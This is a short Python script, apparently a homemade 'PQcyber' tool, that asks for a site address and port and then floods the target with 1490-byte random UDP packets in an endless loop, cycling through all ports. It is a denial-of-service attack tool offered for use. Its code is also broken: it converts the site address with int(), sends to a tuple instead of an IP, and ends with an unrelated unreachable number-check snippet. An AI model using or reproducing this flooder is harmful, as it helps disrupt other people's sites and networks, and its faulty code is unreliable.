import sys
import os
import time
import socket
import random

os.system("clear")
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

#  ip_list = []
#  ais = socket.getaddrinfo("www.yahoo.com",0,0,0,0)
#  for result in ais:
#  ip_list.append(result[-1][0])
#  ip_list = list(set(ip_list))


os.system("clear")




print ('Wellcome to PQcyber softing')
print
site = int(input('Адрес сайта:'))
print
ip = socket.gethostbyname_ex(site)
print ('Site IP: ')
print(ip)
#print
#ip = int(input('IP: '))
print
port = int(input('port: '))

sent = 0

while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ('Sent %s packet to %s throught port:%s'%(sent,ip,port))
     if port == 65534:
       port = 1

a = int(input('Number?'))
if a < -5:
    print('Low')
elif -5 <= a <= 5:
    print('Mid')
else:
    print('High')
